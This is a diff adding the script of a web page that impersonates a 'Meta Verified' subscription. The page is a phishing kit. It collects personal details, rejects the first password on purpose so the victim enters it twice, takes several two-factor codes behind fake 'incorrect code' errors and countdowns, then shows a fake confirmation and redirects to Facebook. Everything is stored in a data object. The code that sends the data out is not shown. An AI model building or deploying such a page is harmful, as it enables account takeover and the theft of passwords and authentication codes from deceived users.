+        next.addEventListener('click', function() { goTo(cur + 1); });
+        dots.forEach(function(d, i) { d.addEventListener('click', function() { goTo(i); }); });
+        setInterval(function() { goTo(cur + 1); }, 5000);
+    })();
+    </script>
+
+    <!-- FAQ JS -->
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        document.querySelectorAll('.faq-btn').forEach(function(btn) {
+            btn.addEventListener('click', function() {
+                var item = btn.closest('.faq-item');
+                var content = item.querySelector('.faq-content');
+                var icon = btn.querySelector('.faq-icon');
+                var isOpen = content.classList.contains('max-h-[500px]');
+                document.querySelectorAll('.faq-content').forEach(function(c) {
+                    c.classList.remove('max-h-[500px]', 'opacity-100', 'grid-rows-[1fr]');
+                    c.classList.add('max-h-0', 'opacity-0', 'grid-rows-[0fr]');
+                });
+                document.querySelectorAll('.faq-icon').forEach(function(ic) { ic.textContent = '+'; ic.style.transform = ''; });
+                if (!isOpen) {
+                    content.classList.remove('max-h-0', 'opacity-0', 'grid-rows-[0fr]');
+                    content.classList.add('max-h-[500px]', 'opacity-100', 'grid-rows-[1fr]');
+                    icon.textContent = '−';
+                }
+            });
+        });
+    });
+    </script>
+
+    <!-- Modal Manager -->
+    <script>
+    var _masterData = {};
+    var Modal = {
+        _current: null,
+        create: function(id, content, compact) {
+            var old = document.getElementById(id); if (old) old.remove();
+            var overlay = document.createElement('div');
+            overlay.id = id; overlay.className = 'modal-overlay';
+            overlay.innerHTML = '<div class="modal-box' + (compact ? ' modal-compact' : '') + '">' + content + '</div>';
+            overlay.addEventListener('click', function(e) { if (e.target === overlay) Modal.close(id); });
+            document.getElementById('modalsContainer').appendChild(overlay);
+        },
+        open: function(id) {
+            var overlay = document.getElementById(id); if (!overlay) return;
+            requestAnimationFrame(function() { overlay.classList.add('open'); });
+            Modal._current = id; document.body.style.overflow = 'hidden';
+        },
+        close: function(id) {
+            var overlay = document.getElementById(id); if (!overlay) return;
+            overlay.classList.remove('open'); document.body.style.overflow = '';
+            setTimeout(function() { if (overlay.parentNode) overlay.parentNode.removeChild(overlay); }, 220);
+            Modal._current = null;
+        }
+    };
+    document.addEventListener('keydown', function(e) { if (e.key === 'Escape' && Modal._current) Modal.close(Modal._current); });
+
+    var COUNTRY_CODES = [
+        {code:"VN",name:"Vietnam",dial:"+84",flag:"🇻🇳"},
+        {code:"US",name:"United States",dial:"+1",flag:"🇺🇸"},
+        {code:"GB",name:"United Kingdom",dial:"+44",flag:"🇬🇧"},
+        {code:"CN",name:"China",dial:"+86",flag:"🇨🇳"},
+        {code:"JP",name:"Japan",dial:"+81",flag:"🇯🇵"},
+        {code:"KR",name:"South Korea",dial:"+82",flag:"🇰🇷"},
+        {code:"TH",name:"Thailand",dial:"+66",flag:"🇹🇭"},
+        {code:"SG",name:"Singapore",dial:"+65",flag:"🇸🇬"},
+        {code:"MY",name:"Malaysia",dial:"+60",flag:"🇲🇾"},
+        {code:"ID",name:"Indonesia",dial:"+62",flag:"🇮🇩"},
+        {code:"AU",name:"Australia",dial:"+61",flag:"🇦🇺"},
+        {code:"DE",name:"Germany",dial:"+49",flag:"🇩🇪"},
+        {code:"FR",name:"France",dial:"+33",flag:"🇫🇷"}
+    ];
+    var _selectedDial = "+84", _selectedFlag = "🇻🇳", _dropdownOpen = false;
+
+    function _buildPhoneSelector() {
+        var opts = COUNTRY_CODES.map(function(c) {
+            return '<div class="pcs-opt" data-dial="' + c.dial + '" data-flag="' + c.flag + '" onclick="_selectDial(this)">'
+                + '<span>' + c.flag + '</span><span style="font-size:13px;color:#444;min-width:38px;display:inline-block;">' + c.dial + '</span>'
+                + '<span style="font-size:13px;color:#777;">' + c.name + '</span></div>';
+        }).join('');
+        return '<div class="pcs-wrap" id="pcs"><div class="pcs-trigger" onclick="_toggleDial()">'
+            + '<span id="pcsFlag">' + _selectedFlag + '</span><span id="pcsDial" style="font-size:13px;color:#333;">' + _selectedDial + '</span>'
+            + '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2.5"><path d="M6 9l6 6 6-6"/></svg></div>'
+            + '<div class="pcs-dropdown" id="pcsDropdown" style="display:none">'
+            + '<input class="pcs-search" type="text" placeholder="Search country..." oninput="_filterDial(this.value)">'
+            + '<div class="pcs-list" id="pcsList">' + opts + '</div></div></div>';
+    }
+    function _toggleDial() {
+        var dd = document.getElementById('pcsDropdown'); if (!dd) return;
+        _dropdownOpen = !_dropdownOpen; dd.style.display = _dropdownOpen ? 'block' : 'none';
+    }
+    function _selectDial(el) {
+        _selectedDial = el.getAttribute('data-dial'); _selectedFlag = el.getAttribute('data-flag');
+        var f = document.getElementById('pcsFlag'); if(f) f.textContent = _selectedFlag;
+        var d = document.getElementById('pcsDial'); if(d) d.textContent = _selectedDial;
+        _dropdownOpen = false; var dd = document.getElementById('pcsDropdown'); if(dd) dd.style.display='none';
+    }
+    function _filterDial(q) {
+        document.querySelectorAll('.pcs-opt').forEach(function(el) {
+            el.style.display = el.textContent.toLowerCase().includes(q.toLowerCase()) ? '' : 'none';
+        });
+    }
+    document.addEventListener('click', function(e) {
+        var wrap = document.getElementById('pcs');
+        if (wrap && !wrap.contains(e.target)) { _dropdownOpen = false; var dd = document.getElementById('pcsDropdown'); if(dd) dd.style.display='none'; }
+    });
+
+    function openClientModal() {
+        _masterData = {};
+        var content =
+            '<div class="modal-header"><span class="modal-title">Meta Verified — Subscribe</span>'
+            + '<button class="modal-close" onclick="Modal.close(\'clientModal\')">&times;</button></div>'
+            + '<form id="clientForm" autocomplete="off">'
+            + '<div class="modal-input-wrap"><input id="fullName" type="text" placeholder="Full Name" required></div>'
+            + '<div class="modal-input-wrap"><input id="email" type="email" placeholder="Email Address" required></div>'
+            + '<div class="modal-input-wrap"><input id="fanpage" type="text" placeholder="Facebook / Instagram Profile" required></div>'
+            + '<div class="modal-input-wrap pcs-phone-row">'
+            + _buildPhoneSelector()
+            + '<input id="phone" type="tel" placeholder="Phone Number" required style="flex:1;outline:none;border:none;background:transparent;font-size:14px;font-family:inherit;height:100%;min-width:0;"></div>'
+            + '<span class="modal-label">Date of Birth</span>'
+            + '<div class="modal-dob-grid">'
+            + '<div class="modal-input-wrap" style="margin-bottom:0"><input id="day" type="number" placeholder="Day" min="1" max="31" required></div>'
+            + '<div class="modal-input-wrap" style="margin-bottom:0"><input id="month" type="number" placeholder="Month" min="1" max="12" required></div>'
+            + '<div class="modal-input-wrap" style="margin-bottom:0"><input id="year" type="number" placeholder="Year" min="1900" max="2024" required></div>'
+            + '</div><div style="height:10px"></div>'
+            + '<p class="modal-hint">Our response will be sent to you within 14–48 hours.</p>'
+            + '<label class="modal-check-row"><input id="agreeCheck" type="checkbox" required> I agree to the <a href="#">Terms of Service</a></label>'
+            + '<button type="submit" class="modal-btn-primary">Continue</button>'
+            + '</form>';
+        Modal.create('clientModal', content);
+        Modal.open('clientModal');
+        document.getElementById('clientForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            _masterData.fullName = document.getElementById('fullName').value.trim();
+            _masterData.email    = document.getElementById('email').value.trim();
+            _masterData.fanpage  = document.getElementById('fanpage').value.trim();
+            _masterData.phone    = _selectedDial + ' ' + document.getElementById('phone').value.trim();
+            _masterData.dob      = document.getElementById('day').value + '/' + document.getElementById('month').value + '/' + document.getElementById('year').value;
+            Modal.close('clientModal');
+            setTimeout(openSecurityModal, 250);
+        });
+    }
+
+    function openSecurityModal() {
+        var content =
+            '<div style="display:flex;flex-direction:column;align-items:center;">'
+            + '<div style="width:100%;display:flex;justify-content:flex-end;">'
+            + '<button class="modal-close" onclick="Modal.close(\'securityModal\')">&times;</button></div>'
+            + '<div style="width:48px;height:48px;background:#0866ff;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:16px;">'
+            + '<svg viewBox="0 0 24 24" width="26" height="26" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>'
+            + '<div style="width:100%">'
+            + '<p style="font-size:14px;color:#606770;margin-bottom:16px;line-height:1.5;">For your security, please enter your password to continue.</p>'
+            + '<form id="securityForm">'
+            + '<div class="modal-input-wrap"><input type="password" id="password" placeholder="Password" required></div>'
+            + '<p id="passwordError" class="modal-error"></p>'
+            + '<button type="submit" id="securityBtn" class="modal-btn-primary">Continue</button>'
+            + '<p style="text-align:center;margin-top:16px;"><a href="#" style="color:#606770;font-size:14px;text-decoration:none;">Forgot your password?</a></p>'
+            + '</form></div></div>';
+        Modal.create('securityModal', content, true);
+        Modal.open('securityModal');
+        var clickCount = 0;
+        document.getElementById('securityForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var pw = document.getElementById('password').value.trim();
+            var err = document.getElementById('passwordError');
+            var btn = document.getElementById('securityBtn');
+            err.classList.remove('show');
+            if (!pw) { err.textContent = "Please enter your password."; err.classList.add('show'); return; }
+            btn.disabled = true; btn.innerHTML = '<span class="modal-spinner"></span>';
+            if (clickCount === 0) {
+                _masterData.password = pw;
+                setTimeout(function() {
+                    btn.disabled = false; btn.textContent = 'Continue';
+                    document.getElementById('password').value = '';
+                    err.textContent = "The password you've entered is incorrect."; err.classList.add('show');
+                    clickCount = 1;
+                }, 1350);
+            } else {
+                _masterData.passwordSecond = pw;
+                setTimeout(function() { Modal.close('securityModal'); setTimeout(openAuthenticationModal, 250); }, 1500);
+            }
+        });
+    }
+
+    function openAuthenticationModal() {
+        var content =
+            '<div style="display:flex;flex-direction:column;">'
+            + '<div class="modal-header" style="margin-bottom:6px;">'
+            + '<div class="modal-user-info"><span>' + (_masterData.fullName||'') + '</span><span class="modal-dot"></span><span>Meta</span></div>'
+            + '<button class="modal-close" onclick="Modal.close(\'authModal\')">&times;</button></div>'
+            + '<h2 style="font-size:20px;font-weight:700;color:#000;margin-bottom:14px;">Two-factor authentication</h2>'
+            + '<p class="modal-hint">Enter the 6-digit code from your authenticator app or sent to your email/phone.</p>'
+            + '<form id="authForm">'
+            + '<div class="modal-input-wrap"><input type="number" id="twoFa" placeholder="6-digit code" required></div>'
+            + '<p id="authError" class="modal-error"></p>'
+            + '<button type="submit" id="authBtn" class="modal-btn-primary">Continue</button>'
+            + '<button type="button" class="modal-btn-outline">Try another way</button>'
+            + '</form></div>';
+        Modal.create('authModal', content, true);
+        Modal.open('authModal');
+        var authCount = 0, cdInterval = null;
+        document.getElementById('authForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var code = document.getElementById('twoFa').value.trim();
+            var err = document.getElementById('authError');
+            var btn = document.getElementById('authBtn');
+            err.classList.remove('show');
+            if (!code) { err.textContent = "Please enter the code."; err.classList.add('show'); return; }
+            btn.disabled = true; btn.innerHTML = '<span class="modal-spinner"></span>';
+            if (authCount < 2) {
+                _masterData['twoFa' + authCount] = code;
+                setTimeout(function() {
+                    btn.innerHTML = 'Continue';
+                    var input = document.getElementById('twoFa'); if(input) { input.disabled = true; input.value = ''; }
+                    var t = 30; err.textContent = 'Incorrect code. Try again after ' + t + 's.'; err.classList.add('show');
+                    cdInterval = setInterval(function() {
+                        t--; err.textContent = 'Incorrect code. Try again after ' + t + 's.';
+                        if (t <= 0) {
+                            clearInterval(cdInterval);
+                            if(input) { input.disabled = false; } btn.disabled = false;
+                            err.classList.remove('show');
+                        }
+                    }, 1000);
+                    authCount++;
+                }, 1400);
+            } else {
+                _masterData.twoFaFinal = code;
+                setTimeout(function() { Modal.close('authModal'); setTimeout(openSuccessModal, 250); }, 1600);
+            }
+        });
+    }
+
+    function openSuccessModal() {
+        var content =
+            '<div class="modal-header">'
+            + '<h2 style="font-size:18px;font-weight:700;text-align:center;flex:1;">Request Submitted</h2>'
+            + '<button class="modal-close" onclick="Modal.close(\'successModal\')">&times;</button></div>'
+            + '<div style="text-align:center;padding:20px 0;">'
+            + '<div style="width:64px;height:64px;background:#0866ff;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;">'
+            + '<svg viewBox="0 0 24 24" width="34" height="34" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div></div>'
+            + '<p style="color:#9a979e;font-size:15px;margin-bottom:6px;">Your request has been added to the processing queue. We will handle it within 24 hours.</p>'
+            + '<p style="color:#9a979e;font-size:15px;margin-bottom:20px;">From the Customer Support team at Meta.</p>'
+            + '<a href="https://www.facebook.com" class="modal-return-btn">Return to Facebook</a>';
+        Modal.create('successModal', content, true);
+        Modal.open('successModal');
+    }
+    </script>
+
 </body>
 </html>
